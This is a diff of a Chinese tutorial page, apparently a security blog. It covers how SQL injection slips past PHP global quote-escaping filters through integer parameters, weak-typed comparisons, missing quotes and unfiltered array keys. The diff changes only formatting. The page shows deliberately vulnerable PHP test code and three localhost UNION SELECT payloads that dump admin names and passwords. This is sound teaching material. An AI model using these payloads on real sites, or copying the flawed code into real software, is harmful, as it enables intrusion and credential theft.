@@ -143,11 +143,10 @@
 <p> 1)注入点类似<code>id=1</code>这种整型的参数就会完全无视<code>GPC</code>的过滤；</p>
 <p> 2)注入点包含键值对的，那么这里只检测了<code>value</code>，对<code>key</code>的过滤就没有防护；</p>
 <p> 3)有时候全局的过滤只过滤掉<code>GET</code>、<code>POST</code>和<code>COOKIE</code>，但是没过滤<code>SERVER</code>等变量。附常见的<code>SERVER</code>变量（具体含义自行百度）：</p>
-<pre><code>QUERY_STRING
-X_FORWARDED_FOR
-CLIENT_IP
-HTTP_HOST
-ACCEPT_LANGUAGE</code></pre><h2 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h2><p>知识储备：<code>php</code>基础、<code>MySQL</code>入门</p>
+<blockquote>
+<p>QUERY_STRING<br>X_FORWARDED_FOR<br>CLIENT_IP<br>HTTP_HOST<br>ACCEPT_LANGUAGE</p>
+</blockquote>
+<h2 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h2><p>知识储备：<code>php</code>基础、<code>MySQL</code>入门</p>
 <p>工具：<code>notepad++</code></p>
 <p>服务器环境：<code>wamp</code></p>
 <p>测试代码:</p>
@@ -228,7 +227,8 @@ ACCEPT_LANGUAGE</code></pre><h2 id="0x01-准备"><a href="#0x01-准备" class="h
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这种数字型的注入是全局防护的盲点，构造注入语句完全不需要单引号的支持，所以也就不存在转义了。例如我们直接构造获取管理员账户密码的<code>POC</code>：</p>
-<pre><code>http://localhost/sqltest/mangdian/int1.php?id=-1 union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042608966044842.png" alt></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://localhost/sqltest/mangdian/int1.php?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,2,concat<span class="token punctuation">(</span>name,0x23,pass<span class="token punctuation">)</span> from admin%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042608966044842.png" alt></p>
 <h3 id="2-php弱类型语言-判断逻辑错误引发注入"><a href="#2-php弱类型语言-判断逻辑错误引发注入" class="headerlink" title="2.php弱类型语言,判断逻辑错误引发注入"></a>2.php弱类型语言,判断逻辑错误引发注入</h3><p>缺陷代码：</p>
 <p><code>int2.php</code>:</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -257,7 +257,8 @@ ACCEPT_LANGUAGE</code></pre><h2 id="0x01-准备"><a href="#0x01-准备" class="h
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当然前提是数字型的注入，这里特殊之处在于增加了个<code>if($id&lt;1)</code>的逻辑判断，但<code>PHP</code>弱类型语言在逻辑判断上<code>0&lt;1</code>和<code>0 union select 1&lt;1</code>是等价的，都返回<code>True</code>。所以构造获取管理员账户密码的<code>POC</code>：</p>
-<pre><code>http://localhost/sqltest/mangdian/int2.php?id=0 union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466043335552089282.png" alt></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://localhost/sqltest/mangdian/int2.php?id<span class="token operator">=</span>0 union <span class="token keyword">select</span> 1,2,concat<span class="token punctuation">(</span>name,0x23,pass<span class="token punctuation">)</span> from admin%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466043335552089282.png" alt></p>
 <h3 id="3-过程中不全是数字型，忘记加单引号"><a href="#3-过程中不全是数字型，忘记加单引号" class="headerlink" title="3.过程中不全是数字型，忘记加单引号"></a>3.过程中不全是数字型，忘记加单引号</h3><p>这种情况是在第一条<code>sql</code>语句里是有单引号保护的，紧接着第二条<code>sql</code>语句没有单引号保护引发的注入，缺陷的代码如下：</p>
 <p><code>int1.php</code>:</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -286,7 +287,8 @@ ACCEPT_LANGUAGE</code></pre><h2 id="0x01-准备"><a href="#0x01-准备" class="h
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>第一条<code>sql</code>语句有单引号保护，第二条<code>sql</code>语句没有了单引号保护从而可以进一步注入。构造获取管理员账户密码的<code>POC</code>：</p>
-<pre><code>http://localhost/sqltest/mangdian/int3.php?id=0 union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042751383037845.png" alt></p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://localhost/sqltest/mangdian/int3.php?id<span class="token operator">=</span>0 union <span class="token keyword">select</span> 1,2,concat<span class="token punctuation">(</span>name,0x23,pass<span class="token punctuation">)</span> from admin%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160616-1466042751383037845.png" alt></p>
 <h2 id="0x04-数组类型，全局防护只过滤了value-key，未过滤代入查询"><a href="#0x04-数组类型，全局防护只过滤了value-key，未过滤代入查询" class="headerlink" title="0x04 数组类型，全局防护只过滤了value/key，未过滤代入查询"></a>0x04 数组类型，全局防护只过滤了value/key，未过滤代入查询</h2><p>全局防护的代码只对数组中的<code>vaule</code>进行了过滤，<code>key</code>未过滤引发注入，全局防护缺陷代码如下：</p>
 <p><code>commonnew.php</code>:</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
